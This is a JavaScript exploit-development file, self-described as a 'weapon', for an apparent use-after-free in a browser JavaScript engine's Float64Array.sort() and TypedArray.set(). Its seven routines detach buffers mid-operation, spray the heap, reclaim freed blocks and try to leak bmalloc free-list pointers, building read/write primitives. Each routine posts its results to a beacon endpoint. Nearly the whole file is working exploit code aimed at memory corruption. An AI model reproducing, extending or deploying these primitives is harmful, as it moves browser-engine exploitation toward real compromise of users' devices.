/* p80-weapon — Weaponize sort() UAF
 *
 * CONFIRMED: Float64Array.sort() continues on freed memory after detach.
 * 1028 comparator calls = 1000+ R/W ops on freed Primitive Gigacage memory.
 *
 * GOAL: Read bmalloc free list pointers from freed memory (heap leak),
 *       then replace freed block with new AB and establish double-access.
 *
 * Beacon prefix: V80W-
 */
(function(){
"use strict";
var RUN_ID = "v80w" + Math.random().toString(36).slice(2,12);
var PREFIX = "V80W-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press80-sort UAF weapon");

function detach(ab) {
  try { structuredClone(ab, { transfer: [ab] }); return true; }
  catch(e) { return false; }
}

function f64ToHex(f) {
  var buf = new ArrayBuffer(8);
  var fv = new Float64Array(buf);
  var uv = new Uint8Array(buf);
  fv[0] = f;
  var h = "";
  for (var i = 7; i >= 0; i--) h += uv[i].toString(16).padStart(2, "0");
  return h;
}

/* ====== X1: Read freed memory values through sort comparator ====== */
function test_X1() {
  var r = {};
  try {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(ab);
    // Fill with ascending values
    for (var i = 0; i < f64.length; i++) f64[i] = i + 1;

    var callCount = 0;
    var detached = false;
    var preDetachVals = [];
    var postDetachVals = [];
    var postDetachHex = [];

    try {
      f64.sort(function(a, b) {
        callCount++;
        if (callCount <= 3) {
          preDetachVals.push(a + "/" + b);
        }
        if (callCount === 5 && !detached) {
          detached = detach(ab);
        }
        if (detached && postDetachVals.length < 20) {
          postDetachVals.push(a + "/" + b);
          postDetachHex.push(f64ToHex(a) + "/" + f64ToHex(b));
        }
        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;
    r.preDetach = preDetachVals.join("|");
    r.postDetach = postDetachVals.slice(0,8).join("|");
    r.postHex = postDetachHex.slice(0,8).join("|");
    r.HAS_HEAP_DATA = postDetachHex.length > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X1-READ-FREED", r);
}

/* ====== X2: Replace freed block + read through sort ====== */
function test_X2() {
  var r = {};
  try {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(ab);
    for (var i = 0; i < f64.length; i++) f64[i] = i + 1;

    var callCount = 0;
    var detached = false;
    var replacement = null;
    var replacementView = null;
    var sawMarker = false;
    var markerVals = [];

    try {
      f64.sort(function(a, b) {
        callCount++;

        if (callCount === 5 && !detached) {
          detached = detach(ab);

          // IMMEDIATELY allocate replacement AB of same size
          // bmalloc should reuse the freed block
          replacement = new ArrayBuffer(SIZE);
          replacementView = new Uint8Array(replacement);
          // Fill with distinctive marker pattern
          for (var k = 0; k < SIZE; k++) replacementView[k] = 0x41; // 'AAAA...'
        }

        if (detached && callCount > 5) {
          // Check if sort is reading our marker data
          var hex = f64ToHex(a);
          if (hex === "4141414141414141") {
            sawMarker = true;
          }
          if (markerVals.length < 15) {
            markerVals.push(callCount + ":" + f64ToHex(a));
          }
        }

        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;
    r.replaced = replacement !== null;
    r.sawMarker = sawMarker;
    r.vals = markerVals.join("|");
    r.REPLACED_READ = sawMarker;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X2-REPLACE", r);
}

/* ====== X3: Write through sort to replacement buffer ====== */
function test_X3() {
  var r = {};
  try {
    var SIZE = 4096;
    var ab = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(ab);
    for (var i = 0; i < f64.length; i++) f64[i] = 100 + i;

    var callCount = 0;
    var detached = false;
    var replacement = null;
    var rView = null;

    try {
      f64.sort(function(a, b) {
        callCount++;

        if (callCount === 5 && !detached) {
          detached = detach(ab);
          replacement = new ArrayBuffer(SIZE);
          rView = new Uint8Array(replacement);
          // Fill with zeros
          for (var k = 0; k < SIZE; k++) rView[k] = 0;
        }

        return a - b; // sort writes sorted values back to memory
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;

    // Check if sort wrote anything to the replacement buffer
    if (rView) {
      var nonZero = 0;
      var samples = [];
      for (var i = 0; i < SIZE; i++) {
        if (rView[i] !== 0) {
          nonZero++;
          if (samples.length < 10) samples.push(i + ":" + rView[i]);
        }
      }
      r.nonZero = nonZero;
      r.samples = samples.join(",");
      r.SORT_WROTE = nonZero > 0;

      // Read as Float64Array to see what sort deposited
      var rf64 = new Float64Array(replacement);
      var fSamples = [];
      for (var j = 0; j < Math.min(rf64.length, 16); j++) {
        if (rf64[j] !== 0) fSamples.push(j + ":" + rf64[j]);
      }
      r.f64Samples = fSamples.join(",");
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X3-WRITE-THRU", r);
}

/* ====== X4: set() UAF — write controlled data to freed memory ====== */
function test_X4() {
  var r = {};
  try {
    var SIZE = 256;
    var ab = new ArrayBuffer(SIZE);
    var dest = new Uint8Array(ab);
    for (var i = 0; i < SIZE; i++) dest[i] = 0;

    var src = new Uint8Array(SIZE);
    for (var j = 0; j < SIZE; j++) src[j] = 0xDD;

    var detached = false;
    var getCalls = 0;
    var replacement = null;
    var rView = null;

    var proxy = new Proxy(src, {
      get: function(target, prop) {
        if (prop === 'length') return target.length;
        getCalls++;
        if (getCalls === 3 && !detached) {
          detached = detach(ab);
          // Allocate replacement in freed slot
          replacement = new ArrayBuffer(SIZE);
          rView = new Uint8Array(replacement);
          for (var k = 0; k < SIZE; k++) rView[k] = 0;
        }
        return target[prop]; // returns 0xDD
      }
    });

    try {
      dest.set(proxy);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,60);
    }

    r.getCalls = getCalls;
    r.detached = detached;

    // Check if set() wrote 0xDD to the replacement buffer
    if (rView) {
      var ddCount = 0;
      var samples = [];
      for (var m = 0; m < SIZE; m++) {
        if (rView[m] === 0xDD) {
          ddCount++;
          if (samples.length < 5) samples.push(m);
        }
      }
      r.ddCount = ddCount;
      r.ddOffsets = samples.join(",");
      r.SET_WROTE = ddCount > 0;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X4-SET-WRITE", r);
}

/* ====== X5: Heap spray + sort UAF → read free list pointer ====== */
function test_X5() {
  var r = {};
  try {
    var SIZE = 4096;

    // Spray many ABs of same size, then free them to populate free list
    var spray = [];
    for (var s = 0; s < 100; s++) {
      var tmp = new ArrayBuffer(SIZE);
      var tv = new Uint8Array(tmp);
      for (var k = 0; k < SIZE; k++) tv[k] = 0xEE;
      spray.push(tmp);
    }
    // Free all spray buffers → creates a free list chain
    for (var f = 0; f < spray.length; f++) {
      detach(spray[f]);
    }
    spray = null;

    // Now allocate our target
    var ab = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(ab);
    for (var i = 0; i < f64.length; i++) f64[i] = i + 1;

    var callCount = 0;
    var detached = false;
    var freeListVals = [];

    try {
      f64.sort(function(a, b) {
        callCount++;
        if (callCount === 3 && !detached) {
          detached = detach(ab);
          // DON'T allocate replacement — let free list pointer sit there
        }
        if (detached && freeListVals.length < 20) {
          freeListVals.push(f64ToHex(a));
        }
        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.callCount = callCount;
    r.detached = detached;
    r.freeListHex = freeListVals.slice(0,10).join("|");

    // Check if any values look like pointers (non-zero, non-small-integer)
    var ptrLike = 0;
    for (var p = 0; p < freeListVals.length; p++) {
      var hex = freeListVals[p];
      if (hex !== "0000000000000000" && !hex.startsWith("40") && !hex.startsWith("3f")) {
        ptrLike++;
      }
    }
    r.ptrLike = ptrLike;
    r.HAS_HEAP_PTRS = ptrLike > 0;

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X5-FREELIST", r);
}

/* ====== X6: Multiple sort UAFs — establish reliable double-access ====== */
function test_X6() {
  var r = {};
  try {
    // Strategy: run sort UAF, allocate replacement, verify shared access
    var SIZE = 2048; // 256 float64 elements

    var ab = new ArrayBuffer(SIZE);
    var f64 = new Float64Array(ab);
    for (var i = 0; i < f64.length; i++) f64[i] = 999.0;

    var detached = false;
    var replacement = null;
    var sharedAccess = false;
    var readFromReplacement = [];

    // We'll use sort to READ from the replacement buffer
    try {
      f64.sort(function(a, b) {
        if (!detached) {
          detached = detach(ab);
          replacement = new ArrayBuffer(SIZE);
          var rv = new Float64Array(replacement);
          // Write distinctive values
          for (var k = 0; k < rv.length; k++) rv[k] = 123456.789;
        }

        // If we see 123456.789, sort is reading from the replacement buffer!
        if (a === 123456.789 || b === 123456.789) {
          sharedAccess = true;
        }
        if (readFromReplacement.length < 10) {
          readFromReplacement.push(a);
        }
        return a - b;
      });
      r.sortOK = true;
    } catch(e) {
      r.sortErr = e.name + ":" + e.message.slice(0,60);
    }

    r.detached = detached;
    r.hasReplacement = replacement !== null;
    r.SHARED_ACCESS = sharedAccess;
    r.readSample = readFromReplacement.slice(0,5).map(function(v){
      return typeof v === 'number' ? v.toString().slice(0,12) : String(v);
    }).join("|");

    // Also check: did sort write back to the replacement buffer?
    if (replacement) {
      var rf = new Float64Array(replacement);
      var modified = 0;
      for (var j = 0; j < rf.length; j++) {
        if (rf[j] !== 123456.789 && rf[j] !== 0) modified++;
      }
      r.modified = modified;
      r.SORT_MODIFIED_REPLACEMENT = modified > 0;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X6-DOUBLE-ACCESS", r);
}

/* ====== X7: set() UAF write → sort UAF read ====== */
function test_X7() {
  var r = {};
  try {
    // Use set() UAF to WRITE controlled data to freed memory,
    // then sort UAF to READ it back as float64

    var SIZE = 256;
    var ab = new ArrayBuffer(SIZE);
    var dest = new Uint8Array(ab);

    // First: set() UAF to write 0x41 pattern
    var src = new Uint8Array(SIZE);
    for (var i = 0; i < SIZE; i++) src[i] = 0x41;

    var detached = false;
    var getCalls = 0;

    var proxy = new Proxy(src, {
      get: function(target, prop) {
        if (prop === 'length') return target.length;
        getCalls++;
        if (getCalls === 3 && !detached) {
          detached = detach(ab);
        }
        return target[prop];
      }
    });

    try {
      dest.set(proxy);
      r.setOK = true;
    } catch(e) {
      r.setErr = e.name + ":" + e.message.slice(0,60);
    }

    r.getCalls = getCalls;
    r.setDetached = detached;

    // Now allocate a NEW AB in the (hopefully) same freed slot
    var ab2 = new ArrayBuffer(SIZE);
    var f64_2 = new Float64Array(ab2);

    // Check if we can see the 0x41 pattern
    var samples = [];
    for (var j = 0; j < f64_2.length; j++) {
      var hex = f64ToHex(f64_2[j]);
      if (hex !== "0000000000000000") {
        samples.push(j + ":" + hex);
      }
    }
    r.nonZeroF64 = samples.length;
    r.f64Samples = samples.slice(0,5).join("|");
    r.SAW_WRITTEN = samples.some(function(s){ return s.indexOf("4141414141") >= 0; });

  } catch(e) { r.err = e.message.slice(0,80); }
  B("X7-SET-THEN-READ", r);
}

/* ====== Run ====== */
try {
  test_X1();
  setTimeout(test_X2, 500);
  setTimeout(test_X3, 1000);
  setTimeout(test_X4, 1500);
  setTimeout(test_X5, 2000);
  setTimeout(test_X6, 2500);
  setTimeout(test_X7, 3000);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe80-done"); }, 22000);
})();
